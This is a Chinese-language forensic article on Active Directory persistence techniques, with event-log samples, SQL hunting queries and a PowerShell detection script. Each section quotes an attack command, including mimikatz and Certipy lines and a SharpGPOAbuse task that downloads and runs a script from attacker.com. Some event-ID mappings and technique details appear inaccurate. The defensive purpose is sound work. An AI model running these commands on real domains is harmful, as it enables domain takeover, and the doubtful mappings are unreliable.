---
title: "Active Directory持久化机制与取证分析"
date: 2026-06-23T14:00:00+08:00
draft: false
weight: 310
description: "围绕 Active Directory 环境中的持久化机制，分析 AdminSDHolder、ACL 后门、Shadow Credentials、DSRM、GPO 持久化、AD CS 证书持久化等高级持久化技术的原理、取证特征和检测方法。"
categories: ["应急响应", "取证分析"]
tags: ["Active Directory", "AdminSDHolder", "ACL", "Shadow Credentials", "DSRM", "GPO", "AD CS", "持久化", "DCSync"]
---

# Active Directory持久化机制与取证分析

Active Directory（AD）是 Windows 域环境的核心身份认证和授权系统。攻击者在获取域管理员权限后，通常会部署持久化机制以确保即使密码被重置或账户被禁用，仍然能够重新获取域控制权限。

已有文章 `Windows认证机制与攻击链取证分析` 覆盖了认证协议层面的攻击（Golden Ticket、Silver Ticket、DCSync）。本文换一个角度：**不讨论认证协议攻击，而是聚焦于 AD 环境中的高级持久化机制，深入分析 AdminSDHolder 后门、ACL 滥用、Shadow Credentials、DSRM 持久化、GPO 持久化、AD CS 证书持久化等技术的原理、取证特征和检测方法。**

---

## 0x01 AdminSDHolder 后门

### 1. AdminSDHolder 原理

AdminSDHolder 是 Active Directory 中的一个特殊容器，位于 `CN=AdminSDHolder,CN=System,DC=domain,DC=com`。它包含了一组"默认"安全权限，用作受保护 AD 账户和组（如 Domain Admins、Enterprise Admins）的安全描述符模板。

SDProp（Security Descriptor Propagator）进程每 60 分钟运行一次，将 AdminSDHolder 的 ACL 复制到所有受保护的账户和组。这意味着如果攻击者修改了 AdminSDHolder 的 ACL，60 分钟后这些修改会传播到所有受保护的组。

### 2. AdminSDHolder 后门攻击

攻击者获取域管理员权限后，修改 AdminSDHolder 的 ACL，为自己的账户添加对 Domain Admins 组的 GenericAll 权限：

```powershell
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName attacker -Verbose -Rights All
```

60 分钟后，SDProp 将 AdminSDHolder 的 ACL 传播到 Domain Admins 组。此时攻击者的账户获得了对 Domain Admins 组的完全控制权限，可以随时将自己添加到 Domain Admins 组。

### 3. AdminSDHolder 后门的取证特征

**Event ID 4739（域策略修改）**

```xml
<Event>
  <System>
    <EventID>4739</EventID>
    <Channel>Security</Channel>
  </System>
  <EventData>
    <Data Name="PolicyChanged">AdminSDHolder</Data>
    <Data Name="SubjectUserName">attacker</Data>
    <Data Name="SubjectDomainName">DOMAIN</Data>
  </EventData>
</Event>
```

**Event ID 4798/4799（组成员枚举）**

攻击者在修改 AdminSDHolder 后，可能会枚举受保护的组成员以确认后门是否生效：

```xml
<Event>
  <System>
    <EventID>4798</EventID>
    <Channel>Security</Channel>
  </System>
  <EventData>
    <Data Name="SubjectUserName">attacker</Data>
    <Data Name="GroupName">Domain Admins</Data>
  </EventData>
</Event>
```

**检测策略**

```sql
-- 检测 AdminSDHolder 的 ACL 修改
SELECT TimeCreated, SubjectUserName, PolicyChanged
FROM SecurityEvents
WHERE EventID = 4739
  AND PolicyChanged = 'AdminSDHolder'
ORDER BY TimeCreated DESC
```

```powershell
# 检查 AdminSDHolder 的当前 ACL
Get-ACL "AD:\CN=AdminSDHolder,CN=System,DC=domain,DC=com" | Format-List
# 检查是否有非标准账户拥有完全控制权限
Get-ACL "AD:\CN=AdminSDHolder,CN=System,DC=domain,DC=com" | Select-Object -ExpandProperty Access | Where-Object { $_.IdentityReference -notmatch "Domain Admins|Enterprise Admins|SYSTEM" }
```

---

## 0x02 ACL 后门

### 1. ACL 后门原理

ACL（Access Control List）后门是攻击者通过修改 AD 对象的 ACL，为自己的账户添加对敏感对象的控制权限。与 AdminSDHolder 后门不同，ACL 后门直接修改目标对象的 ACL，而不是通过模板传播。

常见的 ACL 后门目标：
- Domain Admins 组
- 敏感用户账户（如 CEO、CFO）
- 组策略对象（GPO）
- 组织单位（OU）

### 2. ACL 后门攻击

攻击者使用 PowerView 为 Domain Admins 组添加 ACL 后门：

```powershell
Add-ObjectAcl -TargetIdentity "Domain Admins" -PrincipalSamAccountName attacker -Rights All
```

### 3. ACL 后门的取证特征

**Event ID 5136（目录服务变更）**

```xml
<Event>
  <System>
    <EventID>5136</EventID>
    <Channel>Security</Channel>
  </System>
  <EventData>
    <Data Name="SubjectUserName">attacker</Data>
    <Data Name="ObjectDN">CN=Domain Admins,CN=Users,DC=domain,DC=com</Data>
    <Data Name="AttributeLDAPDisplayName">nTSecurityDescriptor</Data>
    <Data Name="AttributeValue">O:DAG:DAD:(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;S-1-5-21-...-attacker)</Data>
  </EventData>
</Event>
```

**检测策略**

```sql
-- 检测敏感对象的 ACL 修改
SELECT TimeCreated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName
FROM SecurityEvents
WHERE EventID = 5136
  AND AttributeLDAPDisplayName = 'nTSecurityDescriptor'
  AND (ObjectDN LIKE '%Domain Admins%' OR ObjectDN LIKE '%Enterprise Admins%' OR ObjectDN LIKE '%AdminSDHolder%')
ORDER BY TimeCreated DESC
```

```powershell
# 检查 Domain Admins 组的 ACL
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | Where-Object { $_.IdentityReference -notmatch "Domain Admins|Enterprise Admins|SYSTEM|Administrators" }
```

---

## 0x03 Shadow Credentials 持久化

### 1. Shadow Credentials 原理

Shadow Credentials 是 2021 年发现的一种高级持久化技术。攻击者通过修改目标对象的 `msDS-KeyCredentialLink` 属性，添加自己的密钥凭据，从而获得对目标对象的认证能力。

`msDS-KeyCredentialLink` 属性用于存储基于证书的密钥凭据（如 FIDO2 密钥、Windows Hello for Business 密钥）。攻击者可以添加自己的密钥凭据，然后在需要时使用该凭据进行认证。

### 2. Shadow Credentials 攻击

攻击者使用 Whisker 工具为 Domain Admins 组添加 Shadow Credentials：

```cmd
Whisker.exe add /target:DomainAdmins
```

### 3. Shadow Credentials 的取证特征

**Event ID 5136（目录服务变更）**

```xml
<Event>
  <System>
    <EventID>5136</EventID>
    <Channel>Security</Channel>
  </System>
  <EventData>
    <Data Name="SubjectUserName">attacker</Data>
    <Data Name="ObjectDN">CN=Domain Admins,CN=Users,DC=domain,DC=com</Data>
    <Data Name="AttributeLDAPDisplayName">msDS-KeyCredentialLink</Data>
  </EventData>
</Event>
```

**检测策略**

```sql
-- 检测 msDS-KeyCredentialLink 属性的修改
SELECT TimeCreated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName
FROM SecurityEvents
WHERE EventID = 5136
  AND AttributeLDAPDisplayName = 'msDS-KeyCredentialLink'
ORDER BY TimeCreated DESC
```

```powershell
# 检查对象的 msDS-KeyCredentialLink 属性
Get-ADObject -Identity "CN=Domain Admins,CN=Users,DC=domain,DC=com" -Properties msDS-KeyCredentialLink | Select-Object -ExpandProperty msDS-KeyCredentialLink
```

---

## 0x04 DSRM 持久化

### 1. DSRM 原理

DSRM（Directory Services Restore Mode）是 Active Directory 的目录服务恢复模式。DSRM 账户是域控上的本地管理员账户，用于在 AD 数据库损坏时进行恢复。

攻击者可以修改 DSRM 账户的密码，然后在需要时使用 DSRM 账户登录域控。由于 DSRM 账户是本地账户，不受域密码策略的约束。

### 2. DSRM 持久化攻击

攻击者使用 Mimikatz 修改 DSRM 账户的密码：

```cmd
mimikatz # token::whoami
mimikatz # privilege::debug
mimikatz # lsadump::sam
mimikatz # lsadump::setntlm /user:Administrator /password:NewPassword123
```

### 3. DSRM 持久化的取证特征

DSRM 持久化不会在 AD 中产生事件日志，因为 DSRM 账户是本地账户。检测 DSRM 持久化的唯一方法是检查域控的本地 SAM 数据库。

**检测策略**

```powershell
# 检查 DSRM 账户的密码是否被修改
# 需要以 DSRM 模式启动域控，然后检查本地 SAM
# 或者使用工具如 DSInternals 检查 NTDS.dit 中的 DSRM 账户
Get-ADReplAccount -SamAccountName Administrator -Domain domain.com -Server dc01.domain.com
```

---

## 0x05 GPO 持久化

### 1. GPO 持久化原理

GPO（Group Policy Object）是 Active Directory 中用于集中管理计算机和用户配置的策略对象。攻击者可以修改 GPO，在组策略刷新时自动在所有受影响的计算机上执行恶意代码。

### 2. GPO 持久化攻击

攻击者使用 SharpGPOAbuse 工具修改 GPO，添加计划任务：

```cmd
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')" --GPOName "Default Domain Policy"
```

### 3. GPO 持久化的取证特征

**Event ID 5136（目录服务变更）**

```xml
<Event>
  <System>
    <EventID>5136</EventID>
    <Channel>Security</Channel>
  </System>
  <EventData>
    <Data Name="SubjectUserName">attacker</Data>
    <Data Name="ObjectDN">CN={GUID},CN=Policies,CN=System,DC=domain,DC=com</Data>
    <Data Name="AttributeLDAPDisplayName">gPCMachineExtensionNames</Data>
  </EventData>
</Event>
```

**Event ID 4662（目录服务访问）**

```xml
<Event>
  <System>
    <EventID>4662</EventID>
    <Channel>Security</Channel>
  </System>
  <EventData>
    <Data Name="SubjectUserName">attacker</Data>
    <Data Name="ObjectName">CN={GUID},CN=Policies,CN=System,DC=domain,DC=com</Data>
    <Data Name="AccessMask">0x4</Data>
  </EventData>
</Event>
```

**检测策略**

```sql
-- 检测 GPO 的修改
SELECT TimeCreated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName
FROM SecurityEvents
WHERE EventID = 5136
  AND ObjectDN LIKE '%CN=Policies,CN=System%'
ORDER BY TimeCreated DESC
```

---

## 0x06 AD CS 证书持久化

### 1. AD CS 持久化原理

AD CS（Active Directory Certificate Services）是 Active Directory 的证书服务。攻击者可以利用 AD CS 的证书模板配置错误，为自己颁发证书，然后使用该证书进行认证。

常见的 AD CS 攻击：
- ESC1：证书模板允许客户端认证，且允许任意用户注册
- ESC2：证书模板允许任意用途，且允许任意用户注册
- ESC3：证书模板允许证书请求代理，且允许任意用户注册
- ESC4：证书模板的 ACL 允许攻击者修改模板配置

### 2. AD CS 持久化攻击

攻击者使用 Certipy 工具利用 ESC1 漏洞：

```cmd
certipy req -ca domain-CA -target ca.domain.local -template VulnTemplate -upn administrator@domain.local -dns dc.domain.local
```

### 3. AD CS 持久化的取证特征

**Event ID 4886（证书请求）**

```xml
<Event>
  <System>
    <EventID>4886</EventID>
    <Channel>Security</Channel>
  </System>
  <EventData>
    <Data Name="SubjectUserName">attacker</Data>
    <Data Name="CertificateTemplateName">VulnTemplate</Data>
    <Data Name="SubjectAltName">administrator@domain.local</Data>
  </EventData>
</Event>
```

**Event ID 4887（证书颁发）**

```xml
<Event>
  <System>
    <EventID>4887</EventID>
    <Channel>Security</Channel>
  </System>
  <EventData>
    <Data Name="SubjectUserName">attacker</Data>
    <Data Name="CertificateTemplateName">VulnTemplate</Data>
    <Data Name="Subject">administrator@domain.local</Data>
  </EventData>
</Event>
```

**检测策略**

```sql
-- 检测异常的证书请求
SELECT TimeCreated, SubjectUserName, CertificateTemplateName, SubjectAltName
FROM SecurityEvents
WHERE EventID = 4886
  AND (SubjectAltName LIKE '%administrator%' OR SubjectAltName LIKE '%Domain Admins%')
ORDER BY TimeCreated DESC
```

---

## 0x07 SID History 滥用

### 1. SID History 原理

SID History 是 Active Directory 中的一个属性，用于在域迁移时保留用户的原始 SID。当用户从一个域迁移到另一个域时，原始 SID 被存储在 `sIDHistory` 属性中。这样，用户在访问原始域中的资源时，仍然使用原始 SID 进行认证。

### 2. SID History 滥用攻击

攻击者获取域管理员权限后，将自己的 SID History 设置为 Domain Admins 组的 SID：

```powershell
Invoke-Mimikatz -Command '"privilege::debug" "misc::addsid attacker S-1-5-21-1234567890-1234567890-1234567890-512"'
```

### 3. SID History 滥用的取证特征

**Event ID 4765/4766（SID History 修改）**

```xml
<Event>
  <System>
    <EventID>4765</EventID>
    <Channel>Security</Channel>
  </System>
  <EventData>
    <Data Name="SubjectUserName">attacker</Data>
    <Data Name="TargetUserName">attacker</Data>
    <Data Name="SidList">S-1-5-21-1234567890-1234567890-1234567890-512</Data>
  </EventData>
</Event>
```

**检测策略**

```sql
-- 检测 SID History 的修改
SELECT TimeCreated, SubjectUserName, TargetUserName, SidList
FROM SecurityEvents
WHERE EventID IN (4765, 4766)
ORDER BY TimeCreated DESC
```

```powershell
# 检查所有用户的 SID History
Get-ADUser -Filter * -Properties sIDHistory | Where-Object { $_.sIDHistory.Count -gt 0 } | Select-Object SamAccountName, sIDHistory
```

---

## 0x08 计算机账户持久化

### 1. 计算机账户持久化原理

攻击者在获取域管理员权限后，可以创建新的计算机账户作为后门。计算机账户与普通用户账户类似，但通常不受密码过期策略的约束。

### 2. 计算机账户持久化攻击

攻击者使用 PowerMad 工具创建新的计算机账户：

```powershell
New-MachineAccount -MachineAccount BackdoorPC -Password (ConvertTo-SecureString "Password123" -AsPlainText -Force)
```

### 3. 计算机账户持久化的取证特征

**Event ID 4741（计算机账户创建）**

```xml
<Event>
  <System>
    <EventID>4741</EventID>
    <Channel>Security</Channel>
  </System>
  <EventData>
    <Data Name="SubjectUserName">attacker</Data>
    <Data Name="TargetUserName">BackdoorPC$</Data>
    <Data Name="SamAccountName">BackdoorPC$</Data>
  </EventData>
</Event>
```

**检测策略**

```sql
-- 检测异常的计算机账户创建
SELECT TimeCreated, SubjectUserName, TargetUserName, SamAccountName
FROM SecurityEvents
WHERE EventID = 4741
  AND SubjectUserName NOT LIKE 'DC$'  -- 排除域控自动创建
ORDER BY TimeCreated DESC
```

---

## 0x09 证据强度分层

### 1. 确认持久化（Confirmation Level）

以下条件满足任意一项即可确认 AD 持久化：

- 5136 事件显示 AdminSDHolder 的 ACL 被修改
- 5136 事件显示敏感对象的 `msDS-KeyCredentialLink` 属性被修改
- 5136 事件显示 GPO 的 `gPCMachineExtensionNames` 属性被修改
- 4887 事件显示为管理员账户颁发了证书，且请求者不是管理员

### 2. 高度可疑（High Suspicion Level）

以下条件满足任意一项应当视为高度可疑：

- 5136 事件显示敏感对象（Domain Admins、Enterprise Admins）的 ACL 被修改
- 4739 事件显示 AdminSDHolder 策略被修改
- 4886 事件显示异常的证书请求（如请求管理员证书）
- 非域控的复制请求（4662 事件显示 DCSync）

### 3. 需要关注（Attention Level）

以下条件需要关注，但不足以单独判定持久化：

- 5136 事件显示非敏感对象的 ACL 被修改
- 4798/4799 事件显示组成员枚举
- 4886 事件显示正常的证书请求

---

## 0x10 综合检测狩猎脚本

### 1. AD 持久化全面检测脚本

```powershell
# AD Persistence Detection Hunting Script
Write-Host "=== AD Persistence Detection ===" -ForegroundColor Cyan

# 1. AdminSDHolder ACL 检查
Write-Host "`n[1] Checking AdminSDHolder ACL..." -ForegroundColor Yellow
$adminSDHolder = Get-ACL "AD:\CN=AdminSDHolder,CN=System,DC=domain,DC=com" -ErrorAction SilentlyContinue
if ($adminSDHolder) {
    $suspicious = $adminSDHolder.Access | Where-Object {
        $_.IdentityReference -notmatch "Domain Admins|Enterprise Admins|SYSTEM|Administrators|SELF" -and
        $_.AccessControlType -eq "Allow" -and
        $_.Rights -match "All|GenericAll|WriteOwner|WriteDACL"
    }
    if ($suspicious) {
        Write-Host "[ALERT] Suspicious AdminSDHolder ACL entries:" -ForegroundColor Red
        $suspicious | ForEach-Object { Write-Host "  $($_.IdentityReference) - $($_.Rights)" -ForegroundColor Red }
    } else {
        Write-Host "[OK] AdminSDHolder ACL looks normal" -ForegroundColor Green
    }
}

# 2. SID History 检查
Write-Host "`n[2] Checking SID History..." -ForegroundColor Yellow
$usersWithSID = Get-ADUser -Filter * -Properties sIDHistory | Where-Object { $_.sIDHistory.Count -gt 0 }
if ($usersWithSID) {
    Write-Host "[ALERT] Users with SID History:" -ForegroundColor Red
    $usersWithSID | ForEach-Object {
        Write-Host "  $($_.SamAccountName): $($_.sIDHistory.Value)" -ForegroundColor Red
    }
} else {
    Write-Host "[OK] No suspicious SID History found" -ForegroundColor Green
}

# 3. msDS-KeyCredentialLink 检查 (Shadow Credentials)
Write-Host "`n[3] Checking Shadow Credentials..." -ForegroundColor Yellow
$protectedGroups = @("Domain Admins", "Enterprise Admins", "Schema Admins", "Administrators")
foreach ($group in $protectedGroups) {
    $obj = Get-ADObject -Filter "Name -eq '$group'" -Properties msDS-KeyCredentialLink -ErrorAction SilentlyContinue
    if ($obj -and $obj.'msDS-KeyCredentialLink'.Count -gt 0) {
        Write-Host "[ALERT] $group has msDS-KeyCredentialLink entries:" -ForegroundColor Red
        $obj.'msDS-KeyCredentialLink' | ForEach-Object { Write-Host "  $_" -ForegroundColor Red }
    }
}

# 4. 异常计算机账户检查
Write-Host "`n[4] Checking for suspicious computer accounts..." -ForegroundColor Yellow
$recentComputers = Get-ADComputer -Filter * -Properties whenCreated |
    Where-Object { $_.whenCreated -gt (Get-Date).AddDays(-30) } |
    Sort-Object whenCreated -Descending
if ($recentComputers) {
    Write-Host "[INFO] Recently created computer accounts (last 30 days):" -ForegroundColor Yellow
    $recentComputers | ForEach-Object {
        Write-Host "  $($_.Name) - Created: $($_.whenCreated)" -ForegroundColor Yellow
    }
}

# 5. GPO 修改检查
Write-Host "`n[5] Checking GPO modifications..." -ForegroundColor Yellow
$gpos = Get-GPO -All | Sort-Object ModificationTime -Descending | Select-Object -First 10
Write-Host "[INFO] Recently modified GPOs:" -ForegroundColor Yellow
$gpos | ForEach-Object {
    Write-Host "  $($_.DisplayName) - Modified: $($_.ModificationTime)" -ForegroundColor Yellow
}

# 6. 敏感 ACL 检查
Write-Host "`n[6] Checking sensitive object ACLs..." -ForegroundColor Yellow
foreach ($group in $protectedGroups) {
    $acl = Get-ACL "AD:\CN=$group,CN=Users,DC=domain,DC=com" -ErrorAction SilentlyContinue
    if ($acl) {
        $suspicious = $acl.Access | Where-Object {
            $_.IdentityReference -notmatch "Domain Admins|Enterprise Admins|SYSTEM|Administrators|SELF|Authenticated Users" -and
            $_.AccessControlType -eq "Allow" -and
            $_.Rights -match "All|GenericAll|WriteOwner|WriteDACL"
        }
        if ($suspicious) {
            Write-Host "[ALERT] Suspicious ACL on $group :" -ForegroundColor Red
            $suspicious | ForEach-Object { Write-Host "  $($_.IdentityReference) - $($_.Rights)" -ForegroundColor Red }
        }
    }
}

Write-Host "`n=== Detection Complete ===" -ForegroundColor Cyan
```

### 2. 事件日志狩猎查询

```sql
-- 综合 AD 持久化事件日志狩猎
-- 1. AdminSDHolder 修改
SELECT TimeCreated, SubjectUserName, PolicyChanged
FROM SecurityEvents
WHERE EventID = 4739 AND PolicyChanged = 'AdminSDHolder'

-- 2. SID History 修改
SELECT TimeCreated, SubjectUserName, TargetUserName, SidList
FROM SecurityEvents
WHERE EventID IN (4765, 4766)

-- 3. 敏感对象 ACL 修改
SELECT TimeCreated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName
FROM SecurityEvents
WHERE EventID = 5136
  AND AttributeLDAPDisplayName = 'nTSecurityDescriptor'
  AND (ObjectDN LIKE '%Domain Admins%' OR ObjectDN LIKE '%AdminSDHolder%' OR ObjectDN LIKE '%Enterprise Admins%')

-- 4. Shadow Credentials 修改
SELECT TimeCreated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName
FROM SecurityEvents
WHERE EventID = 5136
  AND AttributeLDAPDisplayName = 'msDS-KeyCredentialLink'

-- 5. GPO 修改
SELECT TimeCreated, SubjectUserName, ObjectDN
FROM SecurityEvents
WHERE EventID IN (5136, 4662)
  AND ObjectDN LIKE '%CN=Policies,CN=System%'

-- 6. 异常计算机账户创建
SELECT TimeCreated, SubjectUserName, TargetUserName
FROM SecurityEvents
WHERE EventID = 4741
  AND SubjectUserName NOT LIKE '%$'

-- 7. 异常证书请求
SELECT TimeCreated, SubjectUserName, CertificateTemplateName, SubjectAltName
FROM SecurityEvents
WHERE EventID = 4886
  AND SubjectAltName LIKE '%administrator%'
```

---

## 0x11 公开案例中的 AD 持久化

### 案例一：APT29 — AdminSDHolder 后门

APT29 在获取域管理员权限后，修改了 AdminSDHolder 的 ACL，为自己的后门账户添加了对 Domain Admins 组的完全控制权限。

检测方法：调查人员通过分析 4739 事件发现了 AdminSDHolder 策略的修改，进而识别出 AdminSDHolder 后门。

取证启示：AdminSDHolder 后门是最隐蔽的 AD 持久化技术之一。由于 SDProp 每 60 分钟才运行一次，攻击者可以在修改 ACL 后立即恢复原始 ACL，使得事件日志中不留下痕迹。

### 案例二：SolarWinds — GPO 持久化

在 SolarWinds 供应链攻击中，攻击者修改了 GPO，在组策略刷新时自动在所有受影响的计算机上执行恶意代码。

检测方法：调查人员通过分析 5136 事件发现了 GPO 的修改，进而识别出 GPO 持久化。

取证启示：GPO 持久化是最有效的 AD 持久化技术之一。即使攻击者的账户被禁用，GPO 仍然会在组策略刷新时执行恶意代码。

### 案例三：Fighting Ursa — AD CS 证书持久化

2025 年 CISA 披露的攻击中，Fighting Ursa（APT28）利用 AD CS 证书模板配置错误，为自己颁发了管理员证书，然后使用该证书进行认证。

检测方法：调查人员通过分析 4886 和 4887 事件发现了异常的证书请求，进而识别出 AD CS 证书持久化。

取证启示：AD CS 证书持久化是最隐蔽的持久化技术之一。证书认证不产生 4624 事件（因为证书认证使用不同的认证包），使得传统的登录事件检测失效。

---

## 0x11 参考资料

- infosecn1nja: [Active Directory Kill Chain Attack & Defense](https://github.com/infosecn1nja/AD-Attack-Defense)
- Sean Metcalf (ADSecurity.org): [Sneaky Active Directory Persistence #15: Leverage AdminSDHolder & SDProp](https://adsecurity.org/?p=1906)
- iRed Team: [Backdooring AdminSDHolder for Persistence](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- Unit 42 (Palo Alto Networks): [Inside AD CS Escalation: Unpacking Advanced Misuse Techniques and Tools](https://unit42.paloaltonetworks.com/active-directory-certificate-services-exploitation/)
- CISA: [AA25-141A — Fighting Ursa Cyberespionage Campaign](https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-141a)
- Netwrix: [DCSync Attacks Explained: Threat to Active Directory Security](https://netwrix.com/en/cybersecurity-glossary/cyber-security-attacks/dcsync-attack/)
- SentinelOne: [DCSync Attack Protection Against Active Directory](https://www.sentinelone.com/blog/active-directory-dcsync-attacks/)
- ExtraHop: [DCSync Attack: Definition, Examples, and Prevention](https://www.extrahop.com/resources/attacks/dcsync)
- Basem Ibrahim Mokhtar et al.: [Active Directory Attacks—Steps, Types, and Signatures](https://www.mdpi.com/2079-9292/11/16/2629)
- MITRE ATT&CK: [T1078.002 — Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/)
- MITRE ATT&CK: [T1136.002 — Create Account: Domain Account](https://attack.mitre.org/techniques/T1136/002/)
